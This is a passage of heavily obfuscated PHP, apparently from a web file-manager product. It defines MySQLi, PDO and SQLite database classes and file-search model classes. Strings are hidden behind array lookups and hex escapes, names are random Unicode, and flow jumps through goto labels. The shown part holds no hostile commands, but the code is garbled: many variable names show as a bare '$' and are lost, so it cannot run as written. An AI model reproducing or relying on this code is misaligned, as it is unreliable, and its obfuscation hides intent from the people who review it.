$[1193]); $싗̢ = $[12]; foreach ($ as $) { if ($[$[67]] == $[98]) { $싗̢ = $[$[42]]; } $ = array($[437] . $[$[42]] . $[437], isset($´[$[$[43]]]) ? $´[$[$[43]]] : $[$[43]], $[$[45]] == $[98] ? $[1184] : $[1194] . $[$[66]], $[$[67]] == $[98] ? $[1195] : $[12]); $ݍނ[] = trim(implode($[63], $)); } foreach ($ŀ as $צ => $Ȼ) { $⣫ = str_replace($[1196] . $̎ . $[11], $[12], $צ); $õ = str_replace(array($[128], $[1018]), $[437], substr($Ȼ, stripos($Ȼ, $[312]))); if ($⣫ == $[1173]) { $ց = $[1197] . $싗̢ . $[1198]; } else { $ց = (stripos($⣫, $[11]) ? $[1199] : $[12]) . ($[1200] . $⣫ . $[1201] . $õ); } $ݍނ[] = $ց; } $ݭ = array($[1202] . $̎ . $[1203], $[1204] . $̎ . $[1205], implode($[60] . PHP_EOL, $ݍނ), $[1206]); $˜ = implode(PHP_EOL, $ݭ); if ($ܱ && $ܱ == $[864]) { return $˜; } $޼ = array($[864] => $˜, $[23] => $؋); return $ܱ ? $޼[$ܱ] : $޼; } } goto E; A︡ˤ: class DbMysqli extends Db { public function __construct($ü = '') { $ޮ =& $_SERVER[ʯ]; if (!extension_loaded($ޮ[973])) { think_exception(think_lang($ޮ[24]) . $ޮ[974]); } if (!empty($ü)) { $this->config = $ü; if (empty($this->config[$ޮ[27]])) { $this->config[$ޮ[27]] = $ޮ[12]; } } } public function connect($ƚ = '', $ = 0) { $ܨ =& $_SERVER[ʯ]; if (!isset($this->linkID[$])) { if (empty($ƚ)) { $ƚ = $this->config; } $this->linkID[$] = new mysqli($ƚ[$ܨ[947]], $ƚ[$ܨ[949]], $ƚ[$ܨ[950]], $ƚ[$ܨ[31]], $ƚ[$ܨ[948]] ? intval($ƚ[$ܨ[948]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ = $this->linkID[$]->server_version; $this->linkID[$]->query($ܨ[951] . think_config($ܨ[952]) . $ܨ[68]); if ($ > $ܨ[953]) { $this->linkID[$]->query($ܨ[954]); } $this->connected = !0; if (1 != think_config($ܨ[32])) { unset($this->config); } } return $this->linkID[$]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($) { $­ =& $_SERVER[ʯ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($­[33], 1); think_status($­[34]); $this->queryID = $this->_linkID->query($); if ($this->_linkID->more_results()) { while (($ = $this->_linkID->next_result()) != NULL) { $->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($梗) { $ƿ =& $_SERVER[ʯ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $梗; if ($this->queryID) { $this->free(); } think_action_status($ƿ[35], 1); think_status($ƿ[34]); $ = $this->_linkID->query($梗); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } private function getAll() { $Щ = array(); if ($this->numRows > 0) { for ($ = 0; $ < $this->numRows; $++) { $Щ[$] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Щ; } public function getFields($Ƃ) { $ =& $_SERVER[ʯ]; $埕 = $this->query($[958] . $this->parseKey($Ƃ)); $է = array(); if ($埕) { foreach ($埕 as $˦ => $) { $է[$[$[41]]] = array($[42] => $[$[41]], $[43] => $[$[44]], $[45] => (bool) ($[$[46]] === $[12]), $[47] => $[$[48]], $[49] => strtolower($[$[50]]) == $[51], $[52] => strtolower($[$[53]]) == $[54]); } } return $է; } public function getTables($ى = '') { $ =& $_SERVER[ʯ]; $ޫۓ = !empty($ى) ? $[960] . $ى . $[961] : $[962]; $Ͱ = $this->query($ޫۓ); $à = array(); if ($Ͱ) { foreach ($Ͱ as $۱ => $Δ) { $à[$۱] = current($Δ); } } return $à; } public function replace($, $ = array()) { $ۢᨻ =& $_SERVER[ʯ]; foreach ($ as $޴ => $߿) { $΄ = $this->parseValue($߿); if (is_scalar($΄)) { $񉌯[] = $΄; $Ϋ[] = $this->parseKey($޴); } } $ = $ۢᨻ[963] . $this->parseTable($[$ۢᨻ[331]]) . $ۢᨻ[964] . implode($ۢᨻ[60], $Ϋ) . $ۢᨻ[965] . implode($ۢᨻ[60], $񉌯) . $ۢᨻ[966]; return $this->execute($); } public function insertAll($٢, $֏؁ = array(), $ = false) { $ؿ =& $_SERVER[ʯ]; if (!is_array($٢[0])) { return !1; } $ = array_keys($٢[0]); $Գ = array(); foreach ($٢ as $) { $ = array(); foreach ($ as $ => $) { $ = $this->parseValue($); if (is_scalar($)) { $[] = $; } } $Գ[] = $ؿ[312] . implode($ؿ[60], $) . $ؿ[966]; } array_walk($, array($this, $ؿ[967])); $ = $ ? $ؿ[968] : $ؿ[969]; $׭ܯ = $ . $ؿ[970] . $this->parseTable($֏؁[$ؿ[331]]) . $ؿ[964] . implode($ؿ[60], $) . $ؿ[971] . implode($ؿ[60], $Գ); return $this->execute($׭ܯ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ =& $_SERVER[ʯ]; $this->error = $this->_linkID->errno . $[4] . $this->_linkID->error; if ($[12] != $this->queryStr) { $this->error .= LNG($[58]) . $this->queryStr; } think_trace($this->error, $[12], $[59]); return $this->error; } public function escapeString($ח) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ח); } else { return addslashes($ח); } } public function parseKey(&$ڮ, $Ժ = true) { $ =& $_SERVER[ʯ]; if ($Ժ) { $ڮ = $this->parseKeyCheck($ڮ); } if ($ڮ != $[212] && !preg_match($[972], $ڮ)) { $ڮ = $[437] . trim($ڮ, $[437]) . $[437]; } return $ڮ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ԃ = '') { $ =& $_SERVER[ʯ]; if (!class_exists($[975])) { think_exception(think_lang($[24]) . $[976]); } if (!empty($ԃ)) { $this->config = $ԃ; if (empty($this->config[$[27]])) { $this->config[$[27]] = array(); } } } public function connect($ = '', $ = 0) { $э =& $_SERVER[ʯ]; if (!isset($this->linkID[$])) { if (empty($)) { $ = $this->config; } $ˍЍ = !empty($[$э[27]][$э[28]]) ? $[$э[27]][$э[28]] : $this->pconnect; if ($ˍЍ) { $[$э[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$] = new PDO($[$э[977]], $[$э[949]], $[$э[950]], $[$э[27]]); } catch (PDOException $) { think_exception($->getMessage()); } $this->dbType = $this->_getDsnType($[$э[977]]); if (in_array($this->dbType, array($э[978], $э[979], $э[980], $э[981]))) { think_exception($э[982] . $this->dbType . $э[983] . $this->dbType . $э[984]); } if (!$this->linkID[$]) { think_exception($э[985]); } try { $this->linkID[$]->exec($э[986] . think_config($э[952])); } catch (Exception $) { } $this->connected = !0; if (1 != think_config($э[32])) { unset($this->config); } } return $this->linkID[$]; } public function free() { $this->PDOStatement = null; } public function query($Ͷ, $¡ = array()) { $ =& $_SERVER[ʯ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ͷ; if (!empty($¡)) { $this->queryStr .= $[987] . print_r($¡, !0) . $[988]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($[33], 1); think_status($[34]); $this->PDOStatement = $this->_linkID->prepare($Ͷ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ = $this->PDOStatement->execute($¡); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ô, $֣ = array()) { $Ԅ =& $_SERVER[ʯ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ô; if (!empty($֣)) { $this->queryStr .= $Ԅ[987] . print_r($֣, !0) . $Ԅ[988]; } $ɜ = !1; if ($this->dbType == $Ԅ[981]) { if (preg_match($Ԅ[989], $this->queryStr, $ߍ)) { $this->table = think_config($Ԅ[990]) . str_ireplace(think_config($Ԅ[991]), $Ԅ[430], $ߍ[2]); $ɜ = (bool) $this->query($Ԅ[992] . strtoupper($this->table) . $Ԅ[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ԅ[35], 1); think_status($Ԅ[34]); $this->PDOStatement = $this->_linkID->prepare($ô); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ = $this->PDOStatement->execute($֣); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ɜ || preg_match($Ԅ[993], $ô)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ܚ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ܚ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } private function getAll() { $ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($); return $; } public function getFields($첊) { $àſ =& $_SERVER[ʯ]; $this->initConnect(!0); if (think_config($àſ[994])) { $ = str_replace($àſ[995], $첊, think_config($àſ[994])); } else { switch ($this->dbType) { case $àſ[978]: case $àſ[996]: $ = "\x53\105\114\x45\103\x54\40\40\40\x63\x6f\154\x75\155\156\137\x6e\x61\x6d\x65\x20\x61\163\40\x27\x4e\141\155\x65\x27\x2c\40\40\x20\144\x61\164\141\137\164\x79\x70\145\x20\x61\x73\x20\x27\x54\171\x70\x65\x27\54\40\x20\40\x63\157\154\165\x6d\156\137\144\x65\x66\x61\165\x6c\x74\40\x61\163\40\x27\104\x65\146\141\x75\x6c\x74\47\x2c\40\40\40\x69\x73\x5f\156\x75\154\154\x61\x62\x6c\145\40\x61\x73\40\x27\x4e\165\x6c\x6c\47\xa\11\11\x46\122\117\x4d\x9\x69\156\x66\157\162\155\x61\x74\151\x6f\156\137\x73\143\150\x65\x6d\141\x2e\x74\x61\142\x6c\x65\163\x20\x41\x53\40\x74\xa\11\x9\x4a\x4f\x49\116\x9\151\x6e\x66\157\x72\155\x61\x74\x69\157\x6e\137\x73\x63\150\x65\x6d\141\x2e\143\x6f\154\165\155\156\x73\x20\101\x53\x20\143\xa\11\11\x4f\x4e\40\x20\x74\56\164\141\142\154\145\137\143\x61\164\141\x6c\x6f\147\x20\75\40\x63\x2e\x74\141\142\154\145\137\x63\x61\x74\141\154\157\x67\12\11\x9\x41\x4e\x44\40\x74\x2e\164\x61\142\x6c\145\x5f\163\143\x68\145\155\141\40\75\x20\143\x2e\164\141\142\x6c\x65\x5f\x73\x63\150\145\x6d\141\xa\11\11\101\x4e\104\40\x74\x2e\x74\141\x62\154\x65\137\156\141\x6d\145\40\75\40\143\x2e\x74\x61\142\154\x65\137\156\141\155\x65\12\x9\x9\x57\110\105\x52\x45\x20\40\x20\164\56\x74\x61\x62\154\145\x5f\x6e\141\155\x65\40\x3d\40\47{$첊}\x27"; break; case $àſ[997]: $ = $àſ[998] . $첊 . $àſ[999]; break; case $àſ[979]: case $àſ[981]: $ = $àſ[1000] . $àſ[1001] . $àſ[1002] . strtoupper($첊) . $àſ[1003] . strtoupper($첊) . $àſ[1004]; break; case $àſ[1005]: $ = $àſ[1006] . $첊 . $àſ[1007]; break; case $àſ[980]: break; case $àſ[1008]: default: $ = $àſ[1009] . ($this->dbType == $àſ[1008] ? "\x60{$첊}\x60" : $첊); } } $ = $this->query($); $۱ = array(); if ($) { foreach ($ as $ => $) { $ = array_change_key_case($); $[$àſ[42]] = isset($[$àſ[42]]) ? $[$àſ[42]] : $àſ[430]; $[$àſ[43]] = isset($[$àſ[43]]) ? $[$àſ[43]] : $àſ[430]; $В = isset($[$àſ[325]]) ? $[$àſ[325]] : $[$àſ[42]]; $۱[$В] = array($àſ[42] => $В, $àſ[43] => $[$àſ[43]], $àſ[45] => (bool) (isset($[$àſ[113]]) && $[$àſ[113]] === $àſ[12] || isset($[$àſ[45]]) && $[$àſ[45]] === $àſ[12]), $àſ[47] => isset($[$àſ[47]]) ? $[$àſ[47]] : (isset($[$àſ[66]]) ? $[$àſ[66]] : $àſ[430]), $àſ[49] => isset($[$àſ[104]]) ? strtolower($[$àſ[104]]) == $àſ[51] : (isset($[$àſ[67]]) ? $[$àſ[67]] : !1), $àſ[52] => isset($[$àſ[1010]]) ? strtolower($[$àſ[1010]]) == $àſ[54] : (isset($[$àſ[104]]) ? $[$àſ[104]] : !1)); } } return $۱; } public function getTables($Κ = '') { $ڊ =& $_SERVER[ʯ]; if (think_config($ڊ[1011])) { $ = str_replace($ڊ[1012], $Κ, think_config($ڊ[1011])); } else { switch ($this->dbType) { case $ڊ[979]: case $ڊ[981]: $ = $ڊ[1013]; break; case $ڊ[978]: case $ڊ[996]: $ = $ڊ[1014]; break; case $ڊ[1005]: $ = $ڊ[1015]; break; case $ڊ[980]: think_exception(think_lang($ڊ[1016]) . $ڊ[1017]); break; case $ڊ[997]: $ = $ڊ[55] . $ڊ[56] . $ڊ[57]; break; case $ڊ[1008]: default: if (!empty($Κ)) { $ = $ڊ[960] . $Κ . $ڊ[961]; } else { $ = $ڊ[962]; } } } $Ӌ = $this->query($); $ = array(); foreach ($Ӌ as $ => $ğ) { $[$] = current($ğ); } return $; } protected function parseLimit($) { $̫ =& $_SERVER[ʯ]; $ = $̫[12]; if (!empty($)) { switch ($this->dbType) { case $̫[1005]: case $̫[997]: $ = explode($̫[60], $); if (count($) > 1) { $ .= $̫[61] . $[1] . $̫[62] . $[0] . $̫[63]; } else { $ .= $̫[61] . $[0] . $̫[63]; } break; case $̫[978]: case $̫[996]: break; case $̫[980]: break; case $̫[979]: case $̫[981]: break; case $̫[1008]: default: $ .= $̫[61] . $ . $̫[63]; } } return $; } public function parseKey(&$傪, $ = true) { $픢 =& $_SERVER[ʯ]; if ($) { $傪 = $this->parseKeyCheck($傪); } if ($this->dbType == $픢[1008]) { if ($傪 != $픢[212] && !preg_match($픢[972], $傪)) { $傪 = $픢[437] . trim($傪, $픢[437]) . $픢[437]; } return $傪; } else { return parent::parseKey($傪, $); } } public function close() { $this->_linkID = null; } public function error() { $ =& $_SERVER[ʯ]; if ($this->PDOStatement) { $ = $this->PDOStatement->errorInfo(); $this->error = $[1] . $[4] . $[2]; } else { $this->error = $[12]; } if ($[12] != $this->queryStr) { $this->error .= LNG($[58]) . $this->queryStr; } think_trace($this->error, $[12], $[59]); return $this->error; } public function escapeString($) { $ =& $_SERVER[ʯ]; switch ($this->dbType) { case $[1005]: case $[978]: case $[996]: case $[1008]: return addslashes($); case $[980]: case $[997]: case $[979]: case $[981]: return str_ireplace($[68], $[69], $); } } protected function parseValue($) { $ =& $_SERVER[ʯ]; if (is_string($)) { $ϰÄ = strpos($, $[4]) === 0 && in_array($, array_keys($this->bind)); $ = $ϰÄ ? $this->escapeString($) : $[1018] . $this->escapeString($) . $[1018]; } elseif (isset($[0]) && is_string($[0]) && strtolower($[0]) == $[349]) { $ = $this->escapeString($[1]); } elseif (is_array($)) { $ = array_map(array($this, $[1019]), $); } elseif (is_bool($)) { $ = $ ? $[98] : $[221]; } elseif (is_null($)) { $ = $[113]; } return $; } public function getLastInsertId() { $ =& $_SERVER[ʯ]; switch ($this->dbType) { case $[1005]: case $[997]: case $[978]: case $[996]: case $[980]: case $[1008]: return $this->_linkID->lastInsertId(); case $[979]: case $[981]: $ŷ桁 = $this->table; $ձ = $this->query("\x53\105\x4c\x45\x43\x54\x20{$ŷ桁}\56\143\x75\162\x72\x76\x61\154\x20\143\x75\162\162\166\141\154\x20\x46\122\117\115\40\144\165\x61\x6c"); return $ձ ? $ձ[0][$[1020]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($) { $ =& $_SERVER[ʯ]; if (!CacheLock::fileLock($[23])) { return !1; } $㥚 = parent::query($); CacheLock::fileUnLock($[23]); return $㥚; } public function execute($ᾩ) { $ =& $_SERVER[ʯ]; if (!CacheLock::fileLock($[23])) { return !1; } $ = parent::execute($ᾩ); CacheLock::fileUnLock($[23]); return $; } } goto cÏ; B̲̽: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($̯) { $ր =& $_SERVER[ʯ]; $ա = KodIO::fileTypeList(); $Ȕ = $ա[$̯]; if (!$Ȕ) { return array(); } $˚ = $Ȕ[$ր[184]]; $Րɩ = $ր[7]; if (!$Ȕ[$ր[184]]) { $ɬ = array_to_keyvalue($ա, $ր[12], $ր[184]); $˚ = implode($ր[60], $ɬ); $Րɩ = $ր[2152]; } $ = explode($ր[60], trim($˚, $ր[60])); return array($Րɩ, $); } public function listPathType($) { $ =& $_SERVER[ʯ]; $ϋФ = $this->fileTypeWhere($); if (!$ϋФ) { return array(); } $ńș = USER_ID; $ = Model($[575])->getInfo($ńș); $ԭ = array($[624] => SourceModel::TYPE_USER, $[561] => array($[588], $[571] . $[$[97]][$[190]] . $[589]), $[625] => $ńș, $[622] => 0, $[623] => $ϋФ); return $this->listSource($ԭ); } public function listSearch($ـ, $ո딊 = 300) { $ =& $_SERVER[ʯ]; if (isset($ـ[$[1990]]) && $ـ[$[1990]]) { $ـ[$[1990]] = str_replace($[436], $[2153], trim($ـ[$[1990]])); } $ۅ = $this->_parseSearchWhere($ـ); if (!isset($ۅ[$[481]])) { $ۅ[$[481]] = 0; } $ = $[2154]; $Θ = $ۅ; $ɪ = $; $this->_listSearchBindPinyin($ـ, $ۅ, $); $this->alias($[495])->_makeOrder(); $ۅ = $this->parseWhereLike($ۅ); $ؗ = $this->distinct(!0)->field($)->where($ۅ)->selectPage($ո딊); if ($GLOBALS[$[6]][$[433]][$[434]] && Input::check($ـ[$[1990]], $[631]) && $ؗ[$[418]][$[405]] == 1 && $ؗ[$[418]][$[419]] == 0) { $ؗ = $this->distinct(!0)->field($)->where($Θ)->limit(1000)->select(); $ؗ = array_page_split($ؗ, !1, $ո딊); } $this->_listSearchFileContent($ؗ, $ـ, $ɪ, $Θ); $this->_listSearchDesc($ؗ, $ـ, $ɪ); $this->_listSearchTag($ؗ, $ـ, $ɪ); $this->_listSearchGroupTag($ؗ, $ـ, $ɪ); $this->_listDataApply($ؗ[$[421]]); $this->_listMake($ؗ); return $ؗ; } private function _listSearchFileContent(&$ա, $΂, $󌰞, $) { $نּ =& $_SERVER[ʯ]; if (!$΂[$نּ[1990]] || $ա[$نּ[418]][$نּ[405]] > 1) { return; } if (!isset($[$نּ[42]]) || !is_array($΂[$نּ[517]])) { return; } $[$نּ[517]] = array($نּ[7], $΂[$نּ[517]]); unset($[$نּ[42]]); unset($΂[$نּ[517]]); $򖝮 = $this->field($󌰞)->where($)->limit($نּ[2155])->select(); if (!$򖝮 || count($򖝮) == 0) { return; } $ա[$نּ[421]] = array_merge($򖝮, $ա[$نּ[421]]); $ա[$نּ[418]][$نּ[419]] += count($򖝮); } private function _listSearchTag(&$㠪, $ڭ, $) { $ұ =& $_SERVER[ʯ]; if (!$ڭ[$ұ[1990]] || $㠪[$ұ[418]][$ұ[405]] > 1) { return; } $ç̢ = Model($ұ[2156])->listData(); $٥ = array(); $Ӿ = $ڭ[$ұ[1990]]; foreach ($ç̢ as $) { $бؼ = $[$ұ[42]]; $ = str_replace($ұ[63], $ұ[12], Pinyin::get($бؼ)); if (stripos($бؼ, $Ӿ) !== !1 || stripos($, $Ӿ) !== !1) { $٥[] = $[$ұ[451]]; } } if (!$٥) { return; } $ʋ = array($ұ[476] => array($ұ[7], $٥), $ұ[1704] => USER_ID); $ = Model($ұ[478])->field($ұ[94])->where($ʋ)->select(); $ = array_to_keyvalue($, $ұ[12], $ұ[94]); $Ҷ = array_unique($); $this->_listSearchMerge($㠪, $ڭ, $, $Ҷ); } private function _listSearchDesc(&$ۈ, $, $ʦ) { $ =& $_SERVER[ʯ]; if (!$[$[1990]] || $ۈ[$[418]][$[405]] > 1) { return; } $Ǵ = array($[104] => $[502], $[426] => array($[435], $[1992] . $[$[1990]] . $[1992])); $Ġ = !1; if ($Ġ) { $ = $this->listSearchChildren($[$[189]]); $ = array_unique($); if (!$) { return; } $Ǵ[$[190]] = array($[7], $); } $ۢ = Model($[608])->field($[190])->where($Ǵ)->limit(5000)->select(); $ = array_to_keyvalue($ۢ, $[12], $[190]); $this->_listSearchMerge($ۈ, $, $ʦ, $); } private function _listSearchGroupTag(&$ϓ, $, $˼) { $ =& $_SERVER[ʯ]; if (!$[$[1990]] || $ϓ[$[418]][$[405]] > 1 || !$[$[189]]) { return; } $ = $this->sourceInfo($[$[189]]); if (!$ || $[$[187]] != SourceModel::TYPE_GROUP) { return; } $˺ = $[$[546]]; $ɭ߱ = Model($[2157])->get($˺); $ = array(); $ٻ = $[$[1990]]; foreach ($ɭ߱[$[421]] as $) { $殡 = $[$[42]]; $Հ = str_replace($[63], $[12], Pinyin::get($殡)); if (stripos($殡, $ٻ) !== !1 || stripos($Հ, $ٻ) !== !1) { $[] = $[$[451]]; } } if (!$) { return; } $ʇ = array($[476] => array($[7], $), $[1704] => 0, $[43] => $[2012] . $˺); $ܬ = Model($[478])->field($[94])->where($ʇ)->select(); $ܬ = array_to_keyvalue($ܬ, $[12], $[94]); $ֳ = array_unique($ܬ); $this->_listSearchMerge($ϓ, $, $˼, $ֳ); } private function _listSearchMerge(&$ř, $Ӡ, $ڌ, $Ʌ) { $̕ =& $_SERVER[ʯ]; if (!$Ʌ) { return; } $ = array_to_keyvalue($ř[$̕[421]], $̕[12], $̕[190]); $嫲 = array_diff($Ʌ, $); if (!$嫲) { return; } $ꃍ = array($̕[190] => array($̕[7], $嫲)); $ħ = $this->field($ڌ)->where($ꃍ)->select(); if (!$ħ) { return; } $؋ = array(); foreach ($ħ as $) { if ($this->_listSearchFilter($, $Ӡ)) { $؋[] = $; } } $ř[$̕[421]] = array_merge($؋, $ř[$̕[421]]); $ř[$̕[418]][$̕[419]] += count($؋); } private function _listSearchFilter($, $) { $̻ =& $_SERVER[ʯ]; $ = $[$̻[461]] == $̻[98]; if (!strstr($[$̻[561]], $̻[60] . $[$̻[189]] . $̻[60])) { return !1; } if (isset($[$̻[462]]) && $[$̻[462]] != $̻[1951]) { if ($[$̻[462]] == $̻[85] && !$) { return !1; } if ($[$̻[462]] != $̻[85] && $) { return !1; } if (!strstr($[$̻[184]], $̻[60] . $[$̻[462]] . $̻[60])) { return !1; } } if (isset($[$̻[2158]]) && $[$̻[2158]] < $[$̻[86]]) { return !1; } if (isset($[$̻[2159]]) && $[$̻[2159]] > $[$̻[86]]) { return !1; } if (isset($[$̻[638]]) && $[$̻[638]] != $[$̻[505]]) { return !1; } return !0; } public function listSearchChildren($҉, $ = 5000) { $ =& $_SERVER[ʯ]; $ݫ = array(); $ = $this->sourceInfo($҉); $ = array($[561] => array($[435], $[$[561]] . $[$[190]] . $[589])); $ = $this->field($[86])->where($)->limit($ + 1)->select(); $ = is_array($) ? count($) : 0; if ($ > $) { return $this->_listSearchChildrenNear($҉, $); } $ڥ = $this->field($[190])->where($)->select(); $ݫ = array_to_keyvalue($ڥ, $[12], $[190]); return $ݫ; } private function _listSearchChildrenNear($ͳ, $Ҧ֛) { $ڕ =& $_SERVER[ʯ]; $ = array(); $ = array($ڕ[189] => $ͳ); $ߺ = $this->field($ڕ[2160])->where($)->select(); $߼ = array_to_keyvalue(array_filter_by_field($ߺ, $ڕ[461], $ڕ[98]), $ڕ[12], $ڕ[190]); $ = array_merge($, array_to_keyvalue($ߺ, $ڕ[12], $ڕ[190])); if (!$߼) { return $; } $ = array($ڕ[189] => array($ڕ[7], $߼)); $ߺ = $this->field($ڕ[2160])->where($)->limit($Ҧ֛)->select(); $ = array_merge($, array_to_keyvalue($ߺ, $ڕ[12], $ڕ[190])); $ = array_slice($, 0, $Ҧ֛); return $; } private function _listSearchBindPinyin($ӱ, &$ʾ޽, &$) { $ =& $_SERVER[ʯ]; if (!isset($ӱ[$[1990]]) || !$ӱ[$[1990]]) { return; } if (!Input::check($ӱ[$[1990]], $[370]) || strlen($ӱ[$[1990]]) < 2) { return; } $ = "\x4c\x45\x46\124\x20\112\x4f\111\116\40{$this->tablePrefix}\x69\157\x5f\x73\157\x75\x72\x63\x65\x5f\155\x65\x74\x61\40\x6d\145\x74\141\40\157\x6e\40\x73\x6f\165\162\143\145\x2e\x73\157\165\x72\x63\145\x49\104\40\75\40\155\145\x74\x61\56\163\x6f\x75\162\143\145\111\x44"; $ܰ = array(); $ = str_replace(array($[18], $[63], $[2161]), $[12], $); $ = $[487] . str_replace($[60], $[488], $); $ = $ʾ޽[$[42]]; unset($ʾ޽[$[42]]); foreach ($ʾ޽ as $ї => $ɵ) { $ܰ[$[487] . $ї] = $ɵ; } foreach ($ as $ƫ) { $ܰ[] = array($[492] => $ƫ, $[1061] => $[1994], array($[2162] => $ƫ, $[2163] => array($[7], array($[514], $[513])))); } $this->join($); $ʾ޽ = $ܰ; } private function _parseSearchWhere($) { $өڜ =& $_SERVER[ʯ]; $ = array(); if (isset($[$өڜ[820]]) && $[$өڜ[820]]) { $[$өڜ[95]] = array($өڜ[2164], $[$өڜ[820]]); } if (isset($[$өڜ[821]]) && $[$өڜ[821]]) { $Ʃ = array($өڜ[2165], $[$өڜ[821]]); if ($[$өڜ[95]]) { $[$өڜ[95]] = array($[$өڜ[95]], $Ʃ, $өڜ[2166]); } else { $[$өڜ[95]] = $Ʃ; } } if (isset($[$өڜ[2158]]) && $[$өڜ[2158]] > 0) { $[$өڜ[86]] = array($өڜ[2164], $[$өڜ[2158]]); } if (isset($[$өڜ[2159]]) && $[$өڜ[2159]]) { $Ʃ = array($өڜ[2165], $[$өڜ[2159]]); if ($[$өڜ[86]]) { $[$өڜ[86]] = array($[$өڜ[86]], $Ʃ, $өڜ[2166]); } else { $[$өڜ[86]] = $Ʃ; } } if (isset($[$өڜ[638]]) && $[$өڜ[638]]) { $[] = array($өڜ[505] => $[$өڜ[638]], $өڜ[503] => $[$өڜ[638]], $өڜ[1061] => $өڜ[1994]); } if (isset($[$өڜ[462]]) && $[$өڜ[462]]) { $ÔȈ = $[$өڜ[462]]; if ($ÔȈ == $өڜ[85]) { $[$өڜ[461]] = 1; } else { if ($ÔȈ == $өڜ[2167]) { $[$өڜ[461]] = 0; } else { if ($ÔȈ) { $ÔȈ = is_array($ÔȈ) ? $ÔȈ : explode($өڜ[60], $ÔȈ); $[$өڜ[462]] = array($өڜ[468], $ÔȈ); $[$өڜ[461]] = 0; } } } } $this->_parseSearchParent($, $); if (isset($[$өڜ[1990]]) && trim($[$өڜ[1990]])) { $ = trim($[$өڜ[1990]]); $ר = explode($өڜ[63], $); if (strlen($) > 2 && (substr($, 0, 1) == $өڜ[128] && substr($, -1) == $өڜ[128]) || substr($, 0, 1) == $өڜ[68] && substr($, -1) == $өڜ[68]) { $ = substr($, 1, -1); $ר = array($); } $[$өڜ[42]] = array(array($өڜ[588], $өڜ[1992] . $ . $өڜ[1992])); if (count($ר) > 1) { $[$өڜ[42]] = array(); foreach ($ר as $я׹) { if (!trim($я׹)) { continue; } $[$өڜ[42]][] = array($өڜ[588], $өڜ[1992] . trim($я׹) . $өڜ[1992]); } } } return $; } private function _parseSearchParent($Ǘ, &$׾) { $ =& $_SERVER[ʯ]; if (!isset($Ǘ[$[189]]) || !$Ǘ[$[189]]) { return; } $ܩ⺊ = $this->pathInfo($Ǘ[$[189]]); $ɡ = $ܩ⺊[$[189]] . $[12] === $[221]; $퓖 = $ܩ⺊[$[187]] == $[555]; if ($ܩ⺊[$[572]] == $[573]) { $е = $this->sourceInfo($Ǘ[$[189]]); $ܩ⺊[$[561]] = $е[$[561]]; } $׾[$[628]] = array($[588], $ܩ⺊[$[561]] . $Ǘ[$[189]] . $[589]); $ = isset($Ǘ[$[1855]]) && in_array($[555], $Ǘ[$[1855]]); if (!$ || !$퓖 || !$ɡ || !$ܩ⺊[$[463]]) { return; } if (!AuthModel::authCheckRoot($ܩ⺊[$[463]][$[464]])) { return; } $ = $ܩ⺊[$[546]] . $[12]; if ($ == $[98]) { unset($׾[$[628]]); $׾[$[187]] = self::TYPE_GROUP; return; } $ = Model($[562])->groupChildrenAll($); $˰ = count($); if ($˰ <= 1) { return; } $ = array($[189] => 0, $[187] => self::TYPE_GROUP, $[546] => array($[7], $)); $̘ = $this->field($[2168])->where($)->limit($˰)->select(); $׾[$[628]] = array(); foreach ($̘ as $) { $׾[$[628]][] = array($[588], $[571] . $[$[190]] . $[589]); } $׾[$[628]][] = $[1994]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ܽ) { $ͺ =& $_SERVER[ʯ]; $ڌ = Model($ͺ[554])->where(array($ͺ[1695] => $ܽ))->find(); $沬 = $this->_mkdirRoot(SourceModel::TYPE_USER, $ܽ, $ڌ[$ͺ[42]]); $this->userDesktopAdd($沬); return $沬; } public function userDesktopAdd($ϱۄ) { $Ń =& $_SERVER[ʯ]; $͝ = LNG($Ń[2169]); $ݒм = $this->mkdir($ϱۄ, $͝); $this->metaSet($ݒм, $Ń[2170], 